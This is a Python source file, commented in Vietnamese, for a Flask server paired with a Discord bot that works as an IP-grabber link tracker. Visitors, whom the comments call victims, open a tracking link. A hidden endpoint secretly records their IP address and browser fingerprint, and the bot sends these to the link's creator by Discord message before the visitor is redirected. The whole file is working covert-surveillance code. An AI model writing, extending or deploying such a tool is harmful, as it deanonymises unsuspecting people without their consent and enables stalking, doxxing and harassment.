# app/server.py
from flask import Flask, request, render_template, redirect, url_for, abort, jsonify
from threading import Thread
import discord
import os
from . import database as db
import hashlib  # Import hashlib ở đây để dùng trong send_dm_notification

# Khởi tạo Flask App
# template_folder chỉ định nơi Flask tìm các file HTML
app = Flask(__name__, template_folder='templates')

bot_instance = None # Biến toàn cục để lưu trữ instance của bot

# Hàm này sẽ được gọi từ main.py để nhận instance của bot và cho phép server tương tác với bot
def set_bot_instance(bot):
    global bot_instance
    bot_instance = bot

async def send_dm_notification(creator_id: int, log_data: dict):
    """
    Hàm bất đồng bộ để gửi tin nhắn DM chứa thông tin log đến người tạo tracker.
    Hàm này sẽ chạy trên event loop của bot.
    """
    try:
        user = await bot_instance.fetch_user(creator_id)
        if not user:
            print(f"Không thể tìm thấy user với ID: {creator_id}")
            return

        embed = discord.Embed(
            title="🎯 Đã có người truy cập vào link của bạn!",
            description=f"Một truy cập mới vừa được ghi nhận.",
            color=discord.Color.brand_green()
        )
        embed.add_field(name="👤 Visitor ID", value=f"`{log_data['visitor_id']}`", inline=False)
        embed.add_field(name="🌐 Địa chỉ IP", value=f"`{log_data['ip']}`", inline=False)
        
        fingerprint_text = log_data.get('fingerprint', 'Không thể lấy thông tin.')
        # Rút gọn fingerprint nếu nó quá dài để vừa vào một embed field
        if len(fingerprint_text) > 1024:
            fingerprint_text = fingerprint_text[:1020] + "..."

        embed.add_field(name="🔍 Browser Fingerprint", value=f"```\n{fingerprint_text}\n```", inline=False)
        embed.set_footer(text=f"Tracker ID: {log_data['tracker_id']}")
        embed.timestamp = discord.utils.utcnow()

        await user.send(embed=embed)

    except discord.Forbidden:
        # Xảy ra khi người dùng chặn bot hoặc tắt DM từ người lạ trong server
        print(f"Không thể gửi DM cho {user.name} (ID: {creator_id}). Người dùng đã chặn bot hoặc khóa DM.")
    except Exception as e:
        print(f"Lỗi không xác định khi gửi DM: {e}")

# Endpoint gốc, dùng để kiểm tra xem server có đang chạy không
@app.route('/')
def home():
    return "IP Tracker Web Server is alive and running."

# Endpoint chính mà nạn nhân sẽ truy cập
@app.route('/track/<tracker_id>')
def track_link(tracker_id: str):
    """
    Endpoint mà người dùng sẽ truy cập. Nó sẽ trả về trang HTML có chứa Javascript 
    để thu thập thông tin và chuyển hướng.
    """
    tracker = db.get_tracker_by_id(tracker_id)
    if not tracker:
        # Nếu link không tồn tại, trả về lỗi 404
        abort(404, "Link không tồn tại hoặc đã hết hạn.")
    
    # Render trang HTML, truyền các biến cần thiết (target_url và log_url) vào template
    return render_template(
        'tracker.html',
        target_url=tracker['target_url'],
        log_url=url_for('log_visit', tracker_id=tracker_id, _external=True)
    )

# Endpoint ẩn mà Javascript từ trang tracker.html sẽ gọi đến để gửi dữ liệu
@app.route('/log/<tracker_id>', methods=['POST'])
def log_visit(tracker_id: str):
    """
    Endpoint này nhận dữ liệu fingerprint từ JS qua request POST.
    Nó sẽ lưu dữ liệu vào database và kích hoạt gửi thông báo DM.
    """
    tracker = db.get_tracker_by_id(tracker_id)
    if not tracker:
        return jsonify({"status": "error", "message": "Tracker not found"}), 404

    # Lấy địa chỉ IP chính xác nhất. Ưu tiên header của proxy (Render, Heroku, etc.)
    # để tránh lấy phải IP nội bộ của Docker/Render.
    if request.headers.getlist("X-Forwarded-For"):
        ip = request.headers.getlist("X-Forwarded-For")[0]
    else:
        ip = request.remote_addr

    fingerprint_data = request.json or {}
    
    # Lưu log vào database
    db.add_log(tracker_id, ip, fingerprint_data)

    # Nếu bot đã được khởi tạo và kết nối, gửi thông báo DM
    if bot_instance:
        fp_hash_part = fingerprint_data.get('visitorId', 'unknown')
        visitor_hash = hashlib.md5(f"{ip}-{fp_hash_part}".encode()).hexdigest()[:12]

        log_for_dm = {
            "tracker_id": tracker_id,
            "visitor_id": visitor_hash,
            "ip": ip,
            "fingerprint": "\n".join([f"{k}: {v}" for k, v in fingerprint_data.items()])
        }
        
        # Lên lịch chạy coroutine send_dm_notification trên event loop của bot một cách an toàn.
        # Đây là cách đúng để gọi hàm async của discord.py từ một thread khác (thread của Flask).
        bot_instance.loop.call_soon_threadsafe(
            bot_instance.loop.create_task, 
            send_dm_notification(tracker['creator_id'], log_for_dm)
        )

    # Trả về phản hồi 'ok' để JS biết request đã thành công
    return jsonify({"status": "ok"})


def run_server():
    """
    Hàm chạy Flask server. Nó sẽ lấy PORT từ biến môi trường,
    phù hợp với các nền tảng hosting như Render.
    """
    # Render sẽ đặt biến môi trường 'PORT' cho ứng dụng web của bạn.
    # Nếu không có (khi chạy local), mặc định sẽ dùng port 8080.
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)

def start_web_server(bot):
    """
    Hàm này được gọi từ main.py để khởi động web server trong một thread riêng,
    để không chặn luồng chính của bot.
    """
    set_bot_instance(bot) # Chia sẻ instance của bot cho server
    server_thread = Thread(target=run_server)
    server_thread.daemon = True # Thread sẽ tự tắt khi chương trình chính (bot) kết thúc
    server_thread.start()
    print("🚀 Web Server đã được khởi động.")
